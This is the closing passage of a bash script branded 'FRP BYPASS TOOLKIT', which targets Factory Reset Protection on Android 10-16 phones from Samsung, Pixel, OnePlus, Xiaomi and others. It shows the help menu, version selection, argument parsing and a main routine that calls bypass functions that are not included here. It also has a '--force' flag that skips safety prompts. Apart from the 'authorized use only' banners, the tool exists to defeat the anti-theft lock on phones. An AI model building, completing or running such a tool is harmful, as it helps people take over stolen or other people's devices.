    if [[ -n "${SELECTED_ADB}" ]]; then
        adb -s "${SELECTED_ADB}" shell
    elif [[ -n "${SELECTED_RECOVERY}" ]]; then
        adb -s "${SELECTED_RECOVERY}" shell
    else
        log "ERROR" "No ADB device available"
    fi
}

# ────────────────────────────── HELP MENU ──────────────────────────────────

show_help() {
    echo -e "${BOLD}${WHITE}"
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════╗
║              FRP BYPASS TOOLKIT — AUTHORIZED USE ONLY           ║
║                    Android 10-16 Support  by:ENG -251885                ║
╚══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "USAGE:"
    echo -e "  ${BOLD}${0}${NC} [OPTIONS]"
    echo ""
    echo -e "OPTIONS:"
    echo -e "  ${GREEN}-a, --auto${NC}         Auto-detect device and run bypass (default)"
    echo -e "  ${GREEN}-v, --verbose${NC}      Enable verbose/debug output"
    echo -e "  ${GREEN}-l, --list${NC}         List connected devices"
    echo -e "  ${GREEN}-d, --diagnose${NC}     Run device diagnostics only"
    echo -e "  ${GREEN}-s, --shell${NC}        Drop into interactive ADB shell"
    echo -e "  ${GREEN}-m, --manual${NC}       Manual Android version selection"
    echo -e "  ${GREEN}-r, --recovery${NC}     Reboot and attempt recovery mode bypass"
    echo -e "  ${GREEN}-f, --force${NC}        Skip safety prompts"
    echo -e "  ${GREEN}-h, --help${NC}         Show this help message"
    echo ""
    echo -e "EXAMPLES:"
    echo -e "  ${0}                      # Auto-detect and attempt bypass"
    echo -e "  ${0} -v                   # Auto-detect with verbose logging"
    echo -e "  ${0} -d                   # Device diagnostics only"
    echo -e "  ${0} -m                   # Manual version selection"
    echo -e "  ${0} -r -f               # Recovery mode bypass, skip safety"
    echo ""
    echo -e "COMPATIBLE DEVICES:"
    echo -e "  • Samsung Galaxy S10-S24 series"
    echo -e "  • Google Pixel 4-9 series"
    echo -e "  • OnePlus 8-12 series"
    echo -e "  • Xiaomi Mi/Poco/Redmi devices"
    echo -e "  • Motorola G/E series"
    echo -e "  • LG G/V series"
    echo -e "  • Most Android 10-16 devices with USB Debugging enabled"
    echo ""
    echo -e "${YELLOW}NOTE: This tool is for AUTHORIZED security testing only.${NC}"
    echo -e "${YELLOW}Ensure you have explicit permission before use.${NC}"
}

# ────────────────────────────── MANUAL SELECTION ─────────────────────────────

manual_selection() {
    echo -e "${CYAN}Select Android version:${NC}"
    echo "  1) Android 10 (SDK 29)"
    echo "  2) Android 11 (SDK 30)"
    echo "  3) Android 12 (SDK 31-32)"
    echo "  4) Android 13 (SDK 33)"
    echo "  5) Android 14 (SDK 34)"
    echo "  6) Android 15 (SDK 35)"
    echo "  7) Android 16 (SDK 36)"
    echo "  8) Run ALL techniques (brute-force)"
    read -rp "Choice [1-8]: " ver_choice
    
    case "${ver_choice}" in
        1) ANDROID_MAJOR=10 ;;
        2) ANDROID_MAJOR=11 ;;
        3) ANDROID_MAJOR=12 ;;
        4) ANDROID_MAJOR=13 ;;
        5) ANDROID_MAJOR=14 ;;
        6) ANDROID_MAJOR=15 ;;
        7) ANDROID_MAJOR=16 ;;
        8) ANDROID_MAJOR=99 ;; # Special: run all
        *) echo "Invalid selection"; exit 1 ;;
    esac
}

# ────────────────────────────── MAIN ──────────────────────────────────────

main() {
    local mode="auto"
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -a|--auto)     mode="auto" ;;
            -v|--verbose)  VERBOSE=true ;;
            -l|--list)     mode="list" ;;
            -d|--diagnose) mode="diagnose" ;;
            -s|--shell)    mode="shell" ;;
            -m|--manual)   mode="manual" ;;
            -r|--recovery) mode="recovery" ;;
            -f|--force)    SKIP_SAFETY=true ;;
            -h|--help)     show_help; exit 0 ;;
            *)             echo "Unknown option: $1"; show_help; exit 1 ;;
        esac
        shift
    done
    
    # Initialize
    init_logging
    check_prerequisites
    
    echo -e "${BOLD}${WHITE}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║     🔐  FRP BYPASS TOOLKIT v1.0                     ║"
    echo "║     Authorized Security Testing Tool                ║"
    echo "║     Android 10-16 Compatible  
    ║    "    by:ENG -251885
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    case "${mode}" in
        list)
            detect_devices
            echo -e "\n${GREEN}ADB Device:${NC} ${SELECTED_ADB:-None}"
            echo -e "${GREEN}Fastboot Device:${NC} ${SELECTED_FASTBOOT:-None}"
            echo -e "${GREEN}Recovery Device:${NC} ${SELECTED_RECOVERY:-None}"
            ;;
        diagnose)
            detect_devices
            if [[ -n "${SELECTED_ADB}" || -n "${SELECTED_FASTBOOT}" || -n "${SELECTED_RECOVERY}" ]]; then
                detect_android_version
                show_diagnostics
            fi
            ;;
        shell)
            detect_devices
            interactive_shell
            ;;
        recovery)
            SKIP_SAFETY=true
            detect_devices
            recovery_mode_bypass
            ;;
        manual|auto)
            detect_devices || exit 1
            detect_android_version
            
            if [[ "${mode}" == "manual" ]]; then
                manual_selection
            fi
            
            safety_check
            auto_bypass
            ;;
    esac
    
    log "INFO" "Session completed. Log saved to: ${LOG_FILE}"
    echo -e "\n${GREEN}[✓]${NC} Complete log: ${LOG_FILE}"
}

# ────────────────────────────── ENTRY POINT ──────────────────────────────────

# Trap Ctrl+C gracefully
trap 'echo -e "\n${YELLOW}[!]${NC} Interrupted by user. Exiting."; exit 0' INT TERM

main "$@"
